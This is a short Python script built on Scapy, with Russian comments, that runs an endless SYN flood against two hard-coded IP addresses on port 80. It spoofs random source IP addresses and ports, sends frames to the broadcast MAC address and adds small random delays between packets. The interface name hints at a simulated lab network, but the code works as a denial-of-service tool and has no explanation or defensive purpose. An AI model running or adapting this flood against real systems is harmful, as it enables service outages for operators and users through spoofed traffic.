from scapy.all import *
import random
import time

# Функция для генерации случайного времени ожидания
def random_sleep():
    return random.randint(1, 5) / 1000  # Генерируем случайное число в миллисекундах

# Функция для генерации случайного порта
def random_port():
    return random.randint(1024, 65535)

# IP-адреса целей
targets = ["100.0.0.10", "10.0.0.51"]

# Бесконечный цикл для отправки SYN-пакетов
while True:
    for target in targets:
        # Генерация случайного источника IP и порта
        src_ip = "192.168.1." + str(random.randint(2, 254))
        src_port = random_port()

        # Создание SYN-пакета
        syn_packet = (
            Ether(src="00:00:00:00:00:04", dst="ff:ff:ff:ff:ff:ff") /  # Использование широковещательного MAC-адреса
            IP(src=src_ip, dst=target) /
            TCP(sport=src_port, dport=80, flags="S")  # Флаг SYN
        )

        # Отправка SYN-пакета
        sendp(syn_packet, iface="h1-eth0", verbose=False)

        # Задержка между отправками пакетов
        time.sleep(random_sleep())
